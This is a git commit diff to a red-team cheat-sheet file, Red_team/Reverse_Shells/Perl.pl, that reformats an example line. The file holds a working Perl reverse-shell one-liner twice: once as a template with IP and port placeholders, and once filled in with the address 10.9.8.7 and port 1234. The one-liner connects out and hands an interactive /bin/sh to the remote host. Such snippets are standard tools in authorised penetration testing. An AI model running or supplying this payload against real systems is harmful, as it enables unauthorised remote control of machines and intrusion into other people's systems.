c2563dfcd38c0ce27b13d6fee92e0a9959b2139a
Matt T <85061655+Mattluna@users.noreply.github.com>
2026-09-22 08:53:03 -0400

    Add example usage for Perl reverse shell
    Added an example command for using the Perl reverse shell.

--- Red_team/Reverse_Shells/Perl.pl
+++ Red_team/Reverse_Shells/Perl.pl
@@ -2,4 +2,5 @@
 
 perl -e 'use Socket;$i="{IP}";$p={Port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
-Example: perl -e 'use Socket;$i="10.9.8.7";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+Example: 
+perl -e 'use Socket;$i="10.9.8.7";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
